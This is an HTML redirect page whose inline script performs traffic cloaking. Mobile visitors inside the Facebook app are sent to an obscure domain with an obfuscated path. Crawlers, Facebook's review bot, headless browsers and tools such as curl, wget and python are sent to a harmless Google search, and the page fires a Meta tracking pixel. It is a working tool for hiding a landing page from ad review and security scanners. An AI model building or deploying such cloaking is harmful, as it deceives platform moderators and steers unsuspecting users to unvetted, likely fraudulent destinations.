
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<script>
(function () {
"use strict";

/* ===== CONFIGURATION ===== */

var CONFIG = {
    LINK_1: "https://shoredebatableexpressing.com/a_EfCpDL2zL61UQGcCM/ywLRpGvd4nH/qZ87vMtdHdll_/e__MWSYf8MDhkrmGu5/V2IEKY3bCCK07Uo33/5pd7Y6zmgF/sXD2CpOR4U/aD4Mzw/ivXu48r2opBiiFuj/iSjU/wX6s",
    LINK_2: "https://www.google.com/search?q=fb+debugger&oq=f&gs_lcrp=EgZjaHJvbWUqCAgEEEUYJxg7MgYIABBFGDwyBggBEEUYPDIGCAIQRRg8MhMIAxAuGIMBGMcBGLEDGNEDGIAEMggIBBBFGCcYOzIGCAUQRRg7MgYIBhBFGDwyBggHEEUYPNIBCDI1ODRqMGo0qAIAsAIB&sourceid=chrome&source=chrome.ob&ie=UTF-8",

    PIXEL_ID: "YOUR_META_PIXEL_ID",

    REDIRECT_DELAY: 400,

    ENABLE_PIXEL: true
};

/* ===== DEVICE & SOURCE DETECTION ===== */

var ua = navigator.userAgent || "";

function isMobile() {
    return /Android|iPhone|iPod|Mobile/i.test(ua);
}

function isFacebookApp() {
    return /FBAN|FBAV|FB_IAB/i.test(ua);
}

function isBot() {
    return /bot|crawler|spider|facebookexternalhit|facebot|Googlebot|bingbot|Twitterbot|WhatsApp|TelegramBot|curl|wget|python|headless|Lighthouse/i.test(ua)
        || navigator.webdriver === true
        || !ua;
}

/* ===== TARGET SELECTION ===== */

function getTarget() {

    // Only Facebook App + Mobile users get LINK 1
    if (isMobile() && isFacebookApp() && !isBot()) {
        return CONFIG.LINK_1;
    }

    // Everyone else gets LINK 2
    return CONFIG.LINK_2;
}

/* ===== META PIXEL ===== */

function track() {

    if (!CONFIG.ENABLE_PIXEL ||
        !CONFIG.PIXEL_ID ||
        CONFIG.PIXEL_ID === "YOUR_META_PIXEL_ID") {
        return;
    }

    !function(f,b,e,v,n,t,s) {
        if(f.fbq)return;
        n=f.fbq=function(){
            n.callMethod ?
            n.callMethod.apply(n,arguments) :
            n.queue.push(arguments);
        };
        if(!f._fbq)f._fbq=n;
        n.push=n;
        n.loaded=true;
        n.version='2.0';
        n.queue=[];
        t=b.createElement(e);
        t.async=true;
        t.src=v;
        s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s);
    }(window,document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');

    fbq('init', CONFIG.PIXEL_ID);
    fbq('track', 'PageView');
    fbq('trackCustom', 'SmartRedirect', {
        device: isMobile() ? 'mobile' : 'desktop',
        facebook_app: isFacebookApp(),
        bot: isBot()
    });
}

/* ===== REDIRECT ENGINE ===== */

function startRedirect() {

    var target = getTarget();

    // Prevent redirect loops
    try {
        if (sessionStorage.getItem("smart_redirect_done") === "1") {
            return;
        }
        sessionStorage.setItem("smart_redirect_done", "1");
    } catch(e) {}

    track();

    setTimeout(function() {
        window.location.replace(target);
    }, CONFIG.REDIRECT_DELAY);
}

/* ===== START ===== */

if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", startRedirect, {
        once: true
    });
} else {
    startRedirect();
}

})();
</script>

</head>
<body>
<div style="font-family:Arial;text-align:center;padding:60px 15px;">
    <h2>Please wait...</h2>
    <p>Redirecting you to your destination.</p>
</div>
</body>
</html>
